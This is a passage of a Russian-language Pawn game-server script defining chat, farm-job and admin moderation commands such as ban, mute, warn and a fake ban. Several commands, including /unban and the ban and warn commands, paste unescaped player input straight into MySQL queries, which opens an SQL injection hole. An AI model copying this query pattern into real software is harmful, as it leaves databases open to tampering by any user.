	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(GetPVarInt(playerid,"AntiFlood") > gettime()) return SendClientMessage(playerid, COLOR_GREY, PlayerCanSendEveryThreeSec);
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
	ShowPlayerDialog(playerid, D_WEATHER, 2,"Погода","1) Разные версии синих небес/облаков \
		\n2) Разные версии синих небес/облаков  \
		\n3) Разные версии синих небес/облаков \
		\n4) Разные версии синих небес/облаков \
		\n5) Разные версии синих небес/облаков \
		\n6) Разные версии синих небес/облаков \
		\n7) Разные версии синих небес/облаков \
		\n8) Гроза \
		\n9) Пасмкрно и туман \
		\n10) Ясное синее небо ","Принять","Отмена");
	return true;
}
CMD:o(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(GetPVarInt(playerid,"AntiFlood") > gettime()) return SendClientMessage(playerid, COLOR_GREY, PlayerCanSendEveryThreeSec);
	if(PlayerInfo[playerid][pMuted] > 0) return SendClientMessage(playerid, COLOR_PURPLE, PlayerHaveMuteTime);
	if ((noooc) && PlayerInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_GREY, "OOC чат отключен!");
	if(sscanf(params, "s[96]", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /o [текст]");
	SendMesToAll(COLOR_WHITE, "» %s : %s", PlayerInfo[playerid][pSendername], params[0]);
	return true;}
CMD:ao(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(GetPVarInt(playerid,"AntiFlood") > gettime()) return SendClientMessage(playerid, COLOR_GREY, PlayerCanSendEveryThreeSec);
	if(sscanf(params, "s[96]", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /ao [текст]");
	SendMesToAll(COLOR_GREEN, "» Администратор %s : %s", PlayerInfo[playerid][pSendername], params[0]);
	return true;}
CMD:a(playerid,params[]){
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(PlayerInfo[playerid][pAdmin] < 1) return true;
	if(sscanf(params,"s[96]",params[0])) return SendClientMessage(playerid,-1,"Используйте: /a [ текст ]");
	new stringa[145];
	format(stringa,144,"[A] %s [ID:%d]: %s",PlayerInfo[playerid][pSendername],playerid,params[0]);
	SendAdminMessage(COLOR_ORANGE, stringa);
	return true;}
CMD:b(playerid, params[]){
	if(PlayerLogged[playerid] == 0) return true;
	if(GetPVarInt(playerid,"AntiFlood") > gettime()) return SendClientMessage(playerid, COLOR_GREY, PlayerCanSendEveryThreeSec);
	if(PlayerInfo[playerid][pMuted] > 0) return SendClientMessage(playerid, COLOR_PURPLE, PlayerHaveMuteTime);
	if(sscanf(params, "s[64]", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /b [текст]");
	if(GetPVarInt(playerid,"AntiFlood") > gettime()) return SendClientMessage(playerid, COLOR_GREY, PlayerCanSendEveryThreeSec);
	format(totalstring, 128, "{FFFFFF}%s: (( {AFAFAA}%s{FFFFFF} ))", PlayerInfo[playerid][pSendername], params[0]);
	ProxDetector(20.0, playerid, totalstring,COLOR_FADE2,COLOR_FADE2,COLOR_FADE2,COLOR_FADE2,COLOR_FADE2);
	SetPlayerChatBubble(playerid, params[0], COLOR_GREY, 20.0, 7000);
	return true;}
CMD:s(playerid, params[]){
	if(PlayerLogged[playerid] == 0) return true;
	if(GetPVarInt(playerid,"AntiFlood") > gettime()) return SendClientMessage(playerid, COLOR_GREY, PlayerCanSendEveryThreeSec);
	if(PlayerInfo[playerid][pMuted] > 0) return SendClientMessage(playerid, COLOR_PURPLE, PlayerHaveMuteTime);
	if(sscanf(params, "s[64]", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /s [текст]");
	if(GetPVarInt(playerid,"AntiFlood") > gettime()) return SendClientMessage(playerid, COLOR_GREY, PlayerCanSendEveryThreeSec);
	format(totalstring, 64, "- %s крикнул: %s", PlayerInfo[playerid][pSendername], params[0]);
	ProxDetector(60.0, playerid, totalstring,COLOR_WHITE,COLOR_WHITE,COLOR_WHITE,COLOR_FADE1,COLOR_FADE2);
	SetPlayerChatBubble(playerid,params[0],COLOR_WHITE,60.0,10000);
	if(IsPlayerInAnyVehicle(playerid)) { }
	else ApplyAnimation(playerid,"ON_LOOKERS","shout_01",4.1,0,0,0,0,3000);
	return true;}
CMD:noooc(playerid, params[]){
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(PlayerInfo[playerid][pAdmin] > 2 && (!noooc)) { noooc = 1; return SendClientMessageToAll(COLOR_PURPLE, "[СЕРВЕР] Общий чат выключен администратором!"); }
	if(PlayerInfo[playerid][pAdmin] > 2 && (noooc)) { noooc = 0; SendClientMessageToAll(COLOR_PURPLE, "[СЕРВЕР] Общий чат включен администратором!"); }
	return true;}
CMD:smokeclub(playerid, params[]){
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] > 2 && smokedclub[0] == 0)
	{
		smokedclub[0] = 1;
		smokeobj[0] = CreateObject(2780,569.62890625,-260.27529907,1047.49987793,0.00000000,0.00000000,0.00000000); //object(cj_smoke_mach) (4)
		smokeobj[1] = CreateObject(2780,572.62957764,-269.70260620,1047.49987793,0.00000000,0.00000000,0.00000000); //object(cj_smoke_mach) (5)
		smokeobj[2] = CreateObject(2780,562.74420166,-266.61889648,1047.49987793,0.00000000,0.00000000,0.00000000); //object(cj_smoke_mach) (6)
		smokeobj[3] = CreateObject(2780,564.46929932,-278.97189331,1047.49987793,0.00000000,0.00000000,0.00000000); //object(cj_smoke_mach) (7)
		smokeobj[4] = CreateObject(2780,571.65020752,-284.02038574,1047.49987793,0.00000000,0.00000000,0.00000000); //object(cj_smoke_mach) (8)
	}
	else
	{
		DestroyObject(smokeobj[0]);
		DestroyObject(smokeobj[1]);
		DestroyObject(smokeobj[2]);
		DestroyObject(smokeobj[3]);
		DestroyObject(smokeobj[4]);
		smokedclub[0] = 0;
	}
	return true;}
CMD:smokeclub1(playerid, params[]){
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] > 2 && smokedclub[1] == 0)
	{
		smokedclub[1] = 1;
		smokeobj[5] = CreateObject(2780,556.12231445,-270.20880127,1050.70568848,0.00000000,0.00000000,0.00000000); //object(cj_smoke_mach) (1)
		smokeobj[6] = CreateObject(2780,556.57800293,-257.89770508,1050.70568848,0.00000000,0.00000000,0.00000000); //object(cj_smoke_mach) (2)
		smokeobj[7] = CreateObject(2780,556.09771729,-268.23599243,1050.70568848,0.00000000,0.00000000,0.00000000); //object(cj_smoke_mach) (3)
	}
	else
	{
		DestroyObject(smokeobj[5]);
		DestroyObject(smokeobj[6]);
		DestroyObject(smokeobj[7]);
		smokedclub[1] = 0;
	}
	return true;}
CMD:gov(playerid, params[]){
	if(PlayerLogged[playerid] == 0) return true;
	if(IsTheMember(PlayerInfo[playerid][pMember]))
	{

		if(PlayerInfo[playerid][pMuted] > 0) return SendClientMessage(playerid, COLOR_PURPLE, PlayerHaveMuteTime);
		if(PlayerInfo[playerid][pRank] < 6) return SendClientMessage(playerid, COLOR_GREY, "Функция доступна с 6 ранга!");
		if(sscanf(params, "s[64]", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /gov [текст]");
		SendClientMessageToAll(COLOR_WHITE, "[ ------------------------ Государственные новости ------------------------- ]");
		format(totalstring, 128, "%s %s: %s",FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername], params[0]);
		SendClientMessageToAll(0x006699FF,totalstring);
		printf("%s %s: %s",FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername], params[0]);
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;}
CMD:rr(playerid, params[]){
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(PlayerInfo[playerid][pAdmin] < 1 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "us[64]", params[0],params[1])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /rr [id игрока] [текст]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	SendMes(params[0], COLOR_LIGHTRED, "Администратор %s: %s", PlayerInfo[playerid][pSendername], params[1]);
	SendMes(playerid, COLOR_ORANGE, "Вы ответили %s: %s", sendername(params[0]), params[1]);
	format(totalstring, 128, "[A] Администратор %s ответил %s: %s",PlayerInfo[playerid][pSendername],sendername(params[0]),params[1]);
	SendAdminMessage(COLOR_LIGHTRED, totalstring);
	return true;}
CMD:flip(playerid, params[]){
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, 0x00FF40AA, "Вы не в транспорте!");
	params[0] = GetPlayerVehicleID(playerid);
	new Float:w, Float:x, Float:y, Float:z;
	GetVehicleRotationQuat(params[0], w, x, y, z);
	if(x < 0.1) return SendClientMessage(playerid, 0x00FF40AA, "Транспорт не перевернут!");
	GetVehicleZAngle(params[0], w);
	SetVehicleZAngle(params[0], w);
	return true;}
CMD:funload(playerid, params[]){
	new vehicleid = GetPlayerVehicleID(playerid);
	if(vehicleid == farm1car[0])
	{
		if(IsAFarmer(playerid) && GetPVarInt(playerid,"FarmDuty") == 1)
		{
			if(Seeds[vehicleid] >= 5)
			{
				new string[130];
				SendMes(playerid,COLOR_WHITE,"Вы успешно разгрузили %d кустов конопли.",Seeds[vehicleid]);
				format(string, sizeof(string), "UPDATE "TABLE_FARM" SET fSeeds = %i WHERE id = %d LIMIT 1", Seeds[vehicleid], 1);
				mysql_query(string);
				SendMes(playerid,COLOR_WHITE,"Вы получили %d$ за разгрузку!",Seeds[vehicleid]);
				GiveMoney(playerid,Seeds[vehicleid]);
				FarmInfo[fSeeds] += Seeds[vehicleid];
				Seeds[vehicleid] = 0;
				vehiclerun[vehicleid] = 0;
				RemoveFromVehicle(playerid);
				SetVehicleToRespawn(vehicleid);
				format(string, 50, "Урожайя на складе: %d/100000т", FarmInfo[fSeeds]);
				Update3DTextLabelText(tPickup[29], 0xFFFFFFFF, string);
			}
			else SendMes(playerid,COLOR_WHITE,"В авто должно быть минимум 5 кустов конопли! Отправляйтесь назад!");
		}
	}
	return true;}
CMD:fload(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находится за рулем транспорта!");
	//ShowPlayerDialog
	new vehicleid = GetPlayerVehicleID(playerid);
	if(vehiclerun[vehicleid] == 1) return SendClientMessage(playerid, COLOR_GREY, "Авто уже на поле!");
	if(vehicleid == farm1car[0] || vehicleid == farm1car[1]) // 1 означает ид фермы
	{
		if(IsAFarmer(playerid))
		{
			if(vehicleid == farm1car[1]) // 1 означает ид фермы
			{
				SendMes(playerid,COLOR_WHITE,"Вы зашли в комбайнер");
			}
			else
			{
				SendMes(playerid,COLOR_WHITE,"Вы начали рабочий день на ферме");
				SendMes(playerid,COLOR_WHITE,"Едьте на красный маркер, он указан на карте!");
				SetPVarInt(playerid,"FarmDuty",1); // 1 означает ид фермы
				switch(random(3))
				{
				case 0: SetPlayerRaceCheckpoint(playerid, 1, -270.3902,-1390.7653,10.9946, 0.0, 0.0, 0.0, 8.0);
				case 1: SetPlayerRaceCheckpoint(playerid, 1, -207.0077,-1374.9507,5.7338, 0.0, 0.0, 0.0, 8.0);
				case 2: SetPlayerRaceCheckpoint(playerid, 1, -280.4579,-1335.4176,7.5125, 0.0, 0.0, 0.0, 8.0);
				}
			}
		}
		else
		{
			SendMes(playerid,COLOR_WHITE,"Вы не фермер 1 фермы");
		}
	}
	return true;
}
CMD:kick(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(PlayerInfo[playerid][pAdmin] < 1 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "us", params[0],params[1])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /kick [id игрока] [причина]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	format(totalstring, 100, "Администратор %s кикнул %s. Причина: %s", PlayerInfo[playerid][pSendername], sendername(params[0]), params[1]);
	SendClientMessageToAll(COLOR_LIGHTRED, totalstring);
	SendClientMessage(params[0], COLOR_WHITE, "Соблюдайте правила сервера, чтобы избежать кика");
	GKick(params[0]);
	return true;
}

CMD:skick(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(PlayerInfo[playerid][pAdmin] < 2 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /skick [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	SendMes(playerid,COLOR_ORANGE, "Вы кикнули скрытно игрока: %s",sendername(params[0]));
	GKick(params[0]);
	return true;
}

CMD:getstats(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(PlayerInfo[playerid][pAdmin] < 2 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /getstats [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	Stats(playerid, params[0]);
	SendMes(playerid, COLOR_ORANGE,"Вы смотрите статистику: %s", sendername(params[0]));
	return true;
}

CMD:setstats(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /setstats [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	NameStats[playerid] = params[0];
	format(totalstring, 96, "Изменить статистику: %s", sendername(params[0]));
	ShowPlayerDialog(playerid,D_UCPADMIN, DIALOG_STYLE_LIST, totalstring, "Изменить имя игрока\nИзменить пароль игрока\nИзменить уровень администратора\nИзменить уровень игрока\nИзменить уважение игрока\nИзменить пол игрока\nИзменить статус игрока", "Принять", "Отмена");
	return true;
}

CMD:sban(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(PlayerInfo[playerid][pAdmin] < 5 || AdminLogged[playerid] == false) return true;
	new ip[32], data[32], unbandate;
	if(sscanf(params, "uds", params[0], params[1], params[2])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /ban [id игрока] [кол-во дней] [причина]");
	if(!IsPlayerConnected(params[0]) || params[0] == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(params[1] > 14 || params[1] < 1) return SendClientMessage(playerid, COLOR_GREY, "Кол-во дней от 1 до 14!");
	GetPlayerIp(params[0], ip, 32);
	SendMes(playerid,COLOR_ORANGE,"Вы заблокировали скрытно игрока: %s",sendername(params[0]));
	getdate(years, months, days);
	unbandate = gettime() + params[1]*86400;
	format(data, 32, "%02d.%02d.%04d", days, months, years);
	format(query, sizeof(query), "INSERT INTO bans (name, whobanned, ip, bandate, time, unbandate, reason) VALUES ('%s', '%s','%s', '%s', %d, %d, '%s')", sendername(params[0]),PlayerInfo[playerid][pSendername], ip, data, params[1], unbandate, params[2]);
	mysql_query(query);
	GKick(params[0]);
	return true;
}
CMD:fban(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "uds", params[0], params[1], params[2])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /ban [id игрока] [кол-во дней] [причина]");
	if(!IsPlayerConnected(params[0]) || params[0] == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYEROFFLINE"");
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYERNLOGGED"");
	if(params[1] > 14 || params[1] < 1) return SendClientMessage(playerid, COLOR_GREY, "Кол-ви дней от 1 до 14!");
	format(totalstring, 100, "Администратор %s заблокировал %s. Причина: %s", PlayerInfo[playerid][pSendername], sendername(params[0]), params[2]);
	SendClientMessageToAll(COLOR_LIGHTRED,totalstring);
	SendClientMessage(params[0], COLOR_WHITE, "Вы получили фейк бан ;)");
	return true;
}
CMD:ip(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /ip [id игрока]");
	SendMes(playerid,-1,"IP этого лоха: %s",PlayerInfo[params[0]][pIP]);
	return true;
}
CMD:saveacc(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	SaveAcc();
	SendClientMessage(playerid, COLOR_GREY, "Все аккаунты были сохранены администратором!");
	return true;
}
CMD:ban(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
	new ip[32], data[32], unbandate;
	new string[128];
	if(sscanf(params, "uds", params[0], params[1], params[2])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /ban [id игрока] [кол-во дней] [причина]");
	if(!IsPlayerConnected(params[0]) || params[0] == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYEROFFLINE"");
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYERNLOGGED"");
	if(params[1] > 365 || params[1] < 1) return SendClientMessage(playerid, COLOR_GREY, "Кол-ви дней от 1 до 365!");
	GetPlayerIp(params[0], ip, 32);
	if(params[1] == 365) format(string, 100, "Администратор %s заблокировал %s на 1 год. Причина: %s", PlayerInfo[playerid][pSendername], sendername(params[0]), params[2]);
	if(params[1] == 7) format(string, 100, "Администратор %s заблокировал %s на 1 неделю. Причина: %s", PlayerInfo[playerid][pSendername], sendername(params[0]), params[2]);
	if(params[1] == 30) format(string, 100, "Администратор %s заблокировал %s на 1 месяц. Причина: %s", PlayerInfo[playerid][pSendername], sendername(params[0]), params[2]);
	else format(string, 100, "Администратор %s заблокировал %s на %d дней. Причина: %s", PlayerInfo[playerid][pSendername], sendername(params[0]),params[1], params[2]);
	SendClientMessageToAll(COLOR_LIGHTRED,string);
	getdate(years, months, days);
	unbandate = gettime() + params[1]*86400;
	format(data, 32, "%02d.%02d.%04d", days, months, years);
	format(query, sizeof(query), "INSERT INTO bans (name, whobanned, ip, bandate, time, unbandate, reason) VALUES ('%s', '%s','%s', '%s', %d, %d, '%s')", sendername(params[0]), PlayerInfo[playerid][pSendername], ip, data, params[1], unbandate, params[2]);
	mysql_query(query);
	SendClientMessage(params[0], COLOR_YELLOW, "Вы были заблокированы! Если администратор не прав, сделайте скриншот (F8) и отправьте доказательства на форум");
	GKick(params[0]);
	return true;
}

CMD:unban(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 4 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "s", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /unban [имя игрока]");
	format(query, sizeof(query), "SELECT * FROM bans WHERE name = '%s'", params[0]);
	mysql_query(query);
	mysql_store_result();
	if(!mysql_fetch_row(query)) return SendClientMessage(playerid, COLOR_GREY, "Данный игрок не найден в базе данных!");
	format(query, sizeof(query), "DELETE FROM bans WHERE name = '%s'", params[0]);
	mysql_query(query);
	SendMes(playerid, COLOR_LIGHTRED, "Вы разбанили игрока: %s", params[0]);
	mysql_free_result();
	return true;
}

CMD:home(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(GetPlayerHouse(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не владеете домом!");
	if(MechCallTime[playerid] > 0 || TaxiCallTime[playerid] > 0 || MedicCallTime[playerid] > 0 || GetPVarInt(playerid, "ProductID") > 0) return SendClientMessage(playerid, COLOR_GREY, "Ошибка! Действие невозможно!");
	for(new i = 1; i <= TOTALHOUSE; i++)
	{
		if(strcmp(PlayerInfo[playerid][pSendername],HouseInfo[i][hOwner], true ) == 0 )
		{
			SetPlayerRaceCheckpoint(playerid,1, HouseInfo[i][hEntrx],HouseInfo[i][hEntry],HouseInfo[i][hEntrz],0.0,0.0,0.0, 4.0);
			SendClientMessage(playerid, COLOR_WHITE, "Ваш дом обозначен на карте красной меткой");
			SetPVarInt(playerid, "Home", 1);
		}
	}
	
	return true;
}
CMD:rwarn(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 2 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /rwarn [id]");
	if(!IsPlayerConnected(params[0]) || params[0] == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYEROFFLINE"");
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYERNLOGGED"");
	ShowPlayerDialog(params[0],D_NULL,DIALOG_STYLE_MSGBOX,"Предупреждение!","Вы получили предупреждение от администрации\nВ следующий раз поступит наказание","Закрыть","");
	return true;
}
CMD:explode(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 2 || AdminLogged[playerid] == false) return true;
	new Float:x, Float:y, Float:z;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, -1, "Введите: /explode [id игрока]");
	GetPlayerPos(params[0], Float:x, Float:y, Float:z);
	CreateExplosion(Float:x, Float:y, Float:z, 0, 10);
	return true;
}
CMD:warn(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(PlayerInfo[playerid][pAdmin] < 2 || AdminLogged[playerid] == false) return true;
	new ip[32], data[32], unbandate;
	if(sscanf(params, "us", params[0], params[1])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /warn [id игрока] [причина]");
	if(!IsPlayerConnected(params[0]) || params[0] == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYEROFFLINE"");
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYERNLOGGED"");
	PlayerInfo[params[0]][pWarn]++;
	if(PlayerInfo[params[0]][pWarn] < 3) format(totalstring, 100, "Администратор %s выдал предупреждение %s. Причина: %s", PlayerInfo[playerid][pSendername], sendername(params[0]), params[1]);
	else
	{
		PlayerInfo[params[0]][pWarn] = 0;
		GetPlayerIp(params[0], ip, 32);

		format(totalstring, 100, "Администратор %s заблокировал %s. Причина: %s", PlayerInfo[playerid][pSendername], sendername(params[0]), params[1]);
		getdate(years, months, days);
		unbandate = gettime() + 7*86400;
		format(data, 32, "%02d.%02d.%04d", days, months, years);
		format(query, sizeof(query), "INSERT INTO bans (name, whobanned, ip, bandate, time, unbandate, reason) VALUES ('%s', '%s','%s', '%s', 7, %d, '%s')", sendername(params[0]), PlayerInfo[playerid][pSendername], ip, data, unbandate, params[1]);
		mysql_query(query);
	}
	SendClientMessageToAll(COLOR_LIGHTRED, totalstring);
	GKick(params[0]);
	format(totalstring, 64, "%s получил варн от %s, причина: %s", sendername(params[0]), PlayerInfo[playerid][pSendername],params[1]);
	Log("WarnLog",totalstring);
	return true;
}
CMD:unwarn(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /unwarn [id игрока]");
	if(!IsPlayerConnected(params[0]) || params[0] == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYEROFFLINE"");
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYERNLOGGED"");
	PlayerInfo[params[0]][pWarn] = 0;
	SendMes(playerid, COLOR_ORANGE, "Вы сняли предупреждения: %s", sendername(params[0]));
	return true;
}
CMD:unmute(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 1 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /unmute [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(PlayerInfo[params[0]][pMuted] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не имеет бан чата!");
	PlayerInfo[params[0]][pMuted] = 0;
	SendMes(params[0], COLOR_LIGHTRED, "Администратор %s снял вам бан чата", PlayerInfo[playerid][pSendername]);
	format(totalstring, 100, "Администратор %s снял бан чата у %s",PlayerInfo[playerid][pSendername],sendername(params[0]));
	SendClientMessageToAll(COLOR_LIGHTRED, totalstring);
	return true;
}
CMD:unjail(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 2 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /unjail [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(PlayerInfo[params[0]][pJail] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не находиться в тюрьме!");
	PlayerInfo[params[0]][pJailTime] = 1;
	format(totalstring, 100, "Администратор %s выпустил из тюрьмы %s",PlayerInfo[playerid][pSendername],sendername(params[0]));
	SendClientMessageToAll(COLOR_LIGHTRED, totalstring);
	return true;
}
CMD:mute(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(PlayerInfo[playerid][pAdmin] < 1 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "uds", params[0], params[1], params[2])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /mute [id игрока] [время] [причина]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(PlayerInfo[params[0]][pMuted] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок уже имеет бан чата!");
	if(params[1] > 180 || params[1] < 1) return SendClientMessage(playerid, COLOR_GREY, "Время бан чата от 1 до 180!");
	PlayerInfo[params[0]][pMuted] = params[1]*60;
	format(totalstring, 100, "Администратор %s выдал бан чата %s. Причина: %s",PlayerInfo[playerid][pSendername],sendername(params[0]), params[2]);
	SendClientMessageToAll(COLOR_LIGHTRED, totalstring);
	return true;
}
CMD:jail(playerid, params[])
{
	new string[128];
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 2 || AdminLogged[playerid] == false) return true;
